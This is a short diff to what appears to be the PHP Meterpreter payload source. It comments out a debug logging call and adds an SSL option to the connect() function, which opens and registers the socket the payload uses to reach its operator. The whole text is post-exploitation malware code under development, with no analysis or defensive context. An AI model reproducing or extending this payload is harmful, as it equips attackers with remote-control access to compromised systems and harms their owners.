@@ -43,7 +43,7 @@ function register_command($c) {
 }
 
 function my_print($str) {
-    #error_log($str);
+#    error_log($str);
 }
 
 my_print("Evaling main meterpreter stage");
@@ -766,7 +766,10 @@ function connect($ipaddr, $port, $proto='tcp') {
         $sock = stream_socket_client("{$proto}://{$ipaddr}:{$port}");
         my_print("Got a sock: $sock");
         if (!$sock) { return false; }
-        if ($proto == 'tcp') {
+        if ($proto == 'ssl') {
+            register_stream($sock);
+            stream_set_blocking($sock,0);
+        } elseif ($proto == 'tcp') {
             register_stream($sock);
         } elseif ($proto == 'udp') {
             register_stream($sock, $ipaddr, $port);
